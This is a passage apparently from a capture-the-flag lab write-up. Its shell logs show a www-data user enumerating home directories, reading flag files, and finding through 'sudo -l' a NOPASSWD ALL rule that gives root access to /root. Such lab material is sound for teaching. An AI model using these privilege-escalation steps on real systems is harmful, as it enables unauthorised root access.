
```sh
www-data@ip-10-10-184-193:/$ cd /home
cd /home
www-data@ip-10-10-184-193:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Apr  3 07:46 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
www-data@ip-10-10-184-193:/home$ cd rick
cd rick
www-data@ip-10-10-184-193:/home/rick$ ls -la
ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
www-data@ip-10-10-184-193:/home/rick$ cat "second ingredients"
cat "second ingredients"
1 jerry tear
```

```sh
www-data@ip-10-10-184-193:/home/ubuntu$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-184-193.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-184-193.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
root@ip-10-10-184-193:/home/ubuntu# cd /root
root@ip-10-10-184-193:/home/ubuntu# ls -la
total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Apr  3 07:46 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
root@ip-10-10-184-193:~# cat 3rd.txt
3rd ingredients: fleeb juice
```

(ALL) NOPASSWD: ALL

